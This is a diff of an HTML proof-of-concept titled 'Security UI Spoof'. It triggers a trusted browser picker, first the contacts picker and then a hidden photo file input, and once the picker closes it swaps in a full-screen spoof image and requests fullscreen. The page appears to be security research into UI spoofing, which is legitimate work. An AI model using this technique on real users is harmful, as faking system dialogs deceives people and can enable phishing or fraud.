@@ -1,15 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Security UI Spoof (Post-Picker)</title>
+  <title>Security UI Spoof (Post Photo Picker)</title>
   <meta charset="utf-8">
   <meta name="viewport"
         content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
   <style>
-    body {
+    html, body {
       margin: 0;
       padding: 0;
+      width: 100%;
+      height: 100%;
       background: #000;
       font-family: system-ui, sans-serif;
     }
@@ -19,8 +21,8 @@
       inset: 0;
       width: 100%;
       height: 100%;
-      display: none;
       object-fit: cover;
+      display: none;
     }
 
     #content {
@@ -28,33 +30,41 @@
       text-align: center;
       margin-top: 40vh;
     }
+
+    input {
+      display: none;
+    }
   </style>
 </head>
 
 <body>
 
+<!-- FOTO SPOOF -->
 <img id="spoof" src="spof2.png" alt="spoof-ui">
 
 <div id="content">
   <h1>Click anywhere on the page</h1>
 </div>
 
-<script>
-onclick = async () => {
-  // 1️⃣ Trusted system UI (Contacts Picker)
-  if (navigator.contacts && navigator.contacts.select) {
-    try {
-      await navigator.contacts.select(["name"], { multiple: false });
-    } catch (e) {
-      // user cancelled or error — still continue for demo
-    }
-  }
+<!-- 📸 Photo Picker -->
+<input
+  id="photoPicker"
+  type="file"
+  accept="image/*"
+>
 
-  // 2️⃣ Replace page UI
+<script>
+onclick = () => {
+  // 1️⃣ Trigger trusted system UI (Photo Picker)
+  document.getElementById("photoPicker").click();
+};
+
+document.getElementById("photoPicker").onchange = () => {
+  // 2️⃣ Swap UI ke spoof
   document.getElementById("content").style.display = "none";
   document.getElementById("spoof").style.display = "block";
 
-  // 3️⃣ Enter fullscreen (no race, modern behavior)
+  // 3️⃣ Fullscreen
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
   }
